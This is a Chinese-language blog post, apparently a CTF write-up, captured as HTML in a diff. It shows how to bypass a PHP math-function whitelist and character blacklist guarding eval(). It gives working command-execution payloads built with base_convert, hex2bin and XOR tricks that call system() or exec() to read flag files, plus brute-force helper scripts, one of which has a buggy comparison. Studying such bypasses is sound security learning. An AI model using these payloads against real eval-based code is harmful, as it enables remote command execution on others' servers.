@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>数字函数及其白名单和黑名单的过滤 | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="数字函数及其白名单和黑名单的过滤打开页面，看到源码 1234567891011121314151617181920212223242526272829&lt;?phperror_reporting(0);&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&amp;#x27;c&amp;#x27;]))&amp;#123;    show_source(__FILE__);&amp;#125;el">
+<meta property="og:type" content="article">
+<meta property="og:title" content="数字函数及其白名单和黑名单的过滤">
+<meta property="og:url" content="http://example.com/2021/09/05/%E6%95%B0%E5%AD%97%E5%87%BD%E6%95%B0%E5%8F%8A%E5%85%B6%E7%99%BD%E5%90%8D%E5%8D%95%E5%92%8C%E9%BB%91%E5%90%8D%E5%8D%95%E7%9A%84%E8%BF%87%E6%BB%A4/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="数字函数及其白名单和黑名单的过滤打开页面，看到源码 1234567891011121314151617181920212223242526272829&lt;?phperror_reporting(0);&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&amp;#x27;c&amp;#x27;]))&amp;#123;    show_source(__FILE__);&amp;#125;el">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-09-04T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-09-05T12:18:34.592Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 13.33px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.67px;">http</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 13.33px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.33px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 16.67px;">脚本编写</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-数字函数及其白名单和黑名单的过滤" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/05/%E6%95%B0%E5%AD%97%E5%87%BD%E6%95%B0%E5%8F%8A%E5%85%B6%E7%99%BD%E5%90%8D%E5%8D%95%E5%92%8C%E9%BB%91%E5%90%8D%E5%8D%95%E7%9A%84%E8%BF%87%E6%BB%A4/" class="article-date">
+  	<time datetime="2021-09-04T16:00:00.000Z" itemprop="datePublished">2021-09-05</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      数字函数及其白名单和黑名单的过滤
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="数字函数及其白名单和黑名单的过滤"><a href="#数字函数及其白名单和黑名单的过滤" class="headerlink" title="数字函数及其白名单和黑名单的过滤"></a>数字函数及其白名单和黑名单的过滤</h1><p>打开页面，看到源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line">if(!isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    //例子 c=20-1</span><br><span class="line">    $content = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if (strlen($content) &gt;= 80) &#123;</span><br><span class="line">        die(&quot;太长了不会算&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br><span class="line">    $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];</span><br><span class="line">    preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, $content, $used_funcs);</span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">        if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //帮你算出答案</span><br><span class="line">    eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>通过源码，我们可以看到eval()这个危险函数，但是也看见了正则过滤和白名单和黑名单，因此我们需要绕过这些过滤，然后在eval()中构造恶意代码，限制有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 输入的字符串只能在80个字符以内（不包含80个字符）</span><br><span class="line"></span><br><span class="line">2. $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;];</span><br><span class="line">    你不可以有空格、$、_、[、]、换行符、单引号、双引号</span><br><span class="line"></span><br><span class="line">3. $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];</span><br><span class="line">要有这些数学函数，但是可以选一个或多个</span><br></pre></td></tr></table></figure>
+
+<p>所以我们只能使用白名单中的数学函数及其“.”和“^”等，同时字符数限制在80个以内</p>
+<h2 id="php语言的特点"><a href="#php语言的特点" class="headerlink" title="php语言的特点"></a>php语言的特点</h2><h3 id="动态函数"><a href="#动态函数" class="headerlink" title="动态函数"></a>动态函数</h3><p>php中可以把函数名通过字符串的形式传递给一个变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$function=&quot;sayhello&quot;;$function();</span><br><span class="line"></span><br><span class="line">相当于</span><br><span class="line"></span><br><span class="line">sayhello();</span><br></pre></td></tr></table></figure>
+
+<h3 id="php中函数名默认为字符串"><a href="#php中函数名默认为字符串" class="headerlink" title="php中函数名默认为字符串"></a>php中函数名默认为字符串</h3><p>如白名单中的asinh和pi可以直接异或，这就增加了构造字符的选择，下面有个例子：</p>
+<p>在数学函数中有个is_nan()函数和tan()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$i=is_nan^(6).(4);  #函数名可以作为字符串，参与异或，同时右边有两个字符，所以左边也会只取两个字符，所以相当于”is^(6).(4)“</span><br><span class="line"></span><br><span class="line">$j=tan^(1)(5); #相当于”ta^(1)(5)“</span><br><span class="line"></span><br><span class="line">echo $i; #结果为_G</span><br><span class="line"></span><br><span class="line">echo $j; #结果为ET</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>按照这两个php特性，我们可以加以利用<br>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=tac flag.php</span><br></pre></td></tr></table></figure>
+<p>其中&amp;abs=tac flag.php有空格并不影响，因为它不会参与过滤，同时分析payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">base_convert(37907361743,10,36) =&gt; &quot;hex2bin&quot;</span><br><span class="line">dechex(1598506324) =&gt;&quot;5f474554&quot;</span><br><span class="line">$pi=hex2bin(&quot;5f474554&quot;) =&gt;”$pi=&quot;_GET&quot;“</span><br><span class="line">($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;) =&gt; ($_GET)&#123;1&#125;($_GET)&#123;2&#125;</span><br></pre></td></tr></table></figure>
+<p>其中hex2bin()函数会将16进制转换为ascii字符串，其中为什么base_convert()是37907361743，这是我写的一个exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">for($i=0;$i&lt;=1000000000;$i++)&#123;</span><br><span class="line">	$hex=base_convert($i,10,36);</span><br><span class="line">	if($hex=&quot;hex2bin&quot;)&#123;</span><br><span class="line">		echo $i;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>当然介意百度或记住这个函数的10进制值，如果本地测试($_GET){1}(($_GET){2})建议使用7版本的phpsyudy，否则会出错</p>
+<p>也可以用header来传，即使用getallheaders()函数</p>
+<p>getallheaders()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getallheader()---------------------------------------获取全部HTTP请求头信息</span><br></pre></td></tr></table></figure>
+<p>所以我们可以构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get提交：$pi=base_convert;$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</span><br><span class="line"></span><br><span class="line">post提交：1=命令</span><br></pre></td></tr></table></figure>
+
+<p>分析payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">base_convert(696468,10,36) =&gt; &quot;exec&quot;</span><br><span class="line">$pi(8768397090111664438,10,30) =&gt; &quot;getallheaders&quot;</span><br><span class="line">exec(getallheaders()&#123;1&#125;)</span><br></pre></td></tr></table></figure>
+<p>也可以构造exec(‘cat f*’)或system(‘cat f*’)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//exec(&#x27;hex2bin(dechex(109270211257898))&#x27;) =&gt; exec(&#x27;cat f*&#x27;)</span><br><span class="line">($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))</span><br><span class="line">//system(&#x27;cat&#x27;.dechex(16)^asinh^pi) =&gt; system(&#x27;cat *&#x27;)</span><br><span class="line">base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</span><br></pre></td></tr></table></figure>
+
+<p>当然也可以使用php语言中可以将函数名当作字符串进行异或的特性，所以我们可以写一个exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$payload = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;,  &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27; , &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];</span><br><span class="line">for($k=1;$k&lt;=sizeof($payload);$k++)&#123;</span><br><span class="line">    for($i = 0;$i &lt; 9; $i++)&#123;</span><br><span class="line">        for($j = 0;$j &lt;=9;$j++)&#123;</span><br><span class="line">            $exp = $payload[$k] ^ $i.$j;</span><br><span class="line">            echo($payload[$k].&quot;^$i$j&quot;.&quot;==&gt;$exp&quot;);</span><br><span class="line">            echo &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>所以可以构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=system&amp;1=cat%20/flag</span><br></pre></td></tr></table></figure>
+
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/09/04/unicode%E7%BC%96%E7%A0%81%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">unicode编码安全问题</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="数字函数及其白名单和黑名单的过滤" data-title="数字函数及其白名单和黑名单的过滤" data-url="http://example.com/2021/09/05/%E6%95%B0%E5%AD%97%E5%87%BD%E6%95%B0%E5%8F%8A%E5%85%B6%E7%99%BD%E5%90%8D%E5%8D%95%E5%92%8C%E9%BB%91%E5%90%8D%E5%8D%95%E7%9A%84%E8%BF%87%E6%BB%A4/"  data-images="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" data-content="数字函数及其白名单和黑名单的过滤">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2021 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
